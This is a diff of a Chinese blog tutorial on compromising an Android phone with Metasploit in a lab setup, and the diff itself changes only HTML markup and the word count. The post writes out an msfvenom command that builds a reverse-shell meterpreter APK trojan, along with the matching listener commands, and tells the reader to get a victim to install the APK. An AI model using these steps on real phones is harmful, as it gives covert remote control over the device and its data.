@@ -86,7 +86,7 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    2.3k
+                    2.1k
                 </span>
                 
                 
@@ -128,9 +128,9 @@
         <div class="content markdown animated fadeIn">
             <h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>Kali:172.16.28.153<br>Android:172.16.28.158</p>
 <a id="more"></a>
-<p>首先用Msfvenom生成一个apk木马<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &gt; /root/apk.apk</span><br></pre></td></tr></table></div></figure></p>
+<p>首先用Msfvenom生成一个apk木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/11/18/利用msf渗透Android手机/apk.png" alt></p>
-<p>然后msfconsole设置监听(默认监听端口4444)<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line">set lhost 172.16.28.153</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure></p>
+<p>然后msfconsole设置监听(默认监听端口4444)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line">set lhost 172.16.28.153</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
 <p>想办法让受害者点击这个木马apk，这里没有做免杀，手机肯定会报出病毒的警告</p>
 <p><img src="/2019/11/18/利用msf渗透Android手机/meterpreter.png" alt></p>
 <p>我们会拿到一个meterpreter，这里可以输入 help/? 来查看我们能够输入的命令<br><img src="/2019/11/18/利用msf渗透Android手机/core.png" alt></p>
